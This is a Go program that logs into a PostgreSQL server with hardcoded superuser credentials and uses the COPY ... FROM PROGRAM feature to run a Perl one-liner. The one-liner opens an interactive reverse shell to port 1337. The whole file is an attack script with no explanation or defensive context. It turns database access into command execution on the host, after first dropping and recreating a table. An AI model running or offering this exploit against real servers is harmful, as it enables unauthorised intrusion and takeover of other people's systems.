package main

import (
    "database/sql"
    "strconv"
    "log"

    _ "github.com/lib/pq"
)

const (
    host     = "10.244.0.16"
    port     = 5432 // Default port for PostgreSQL
    user     = "postgres"
    password = "hockey"
)

func main() {
    // Construct the connection string
    psqlInfo := "host=" + host + " port=" + strconv.Itoa(port) + " user=" + user + " password=" + password + " sslmode=disable"

    // Open a connection to the database
    db, err := sql.Open("postgres", psqlInfo)
    if err != nil {
        log.Fatal(err)
    }
    defer db.Close()

    // Check the connection
    err = db.Ping()
    if err != nil {
        log.Fatal(err)
    }

    // Execute SQL commands
    _, err = db.Exec(`DROP TABLE IF EXISTS cmd_exec;`)
    if err != nil {
        log.Fatal(err)
    }

    _, err = db.Exec(`CREATE TABLE cmd_exec(cmd_output text);`)
    if err != nil {
        log.Fatal(err)
    }
    _, err = db.Exec(`COPY cmd_exec FROM PROGRAM 'perl -e "use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(1337,inet_aton(\"127.0.0.1\")))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"'`)
    if err != nil {
        log.Fatal(err)
    }

    log.Println("Commands executed successfully")
}
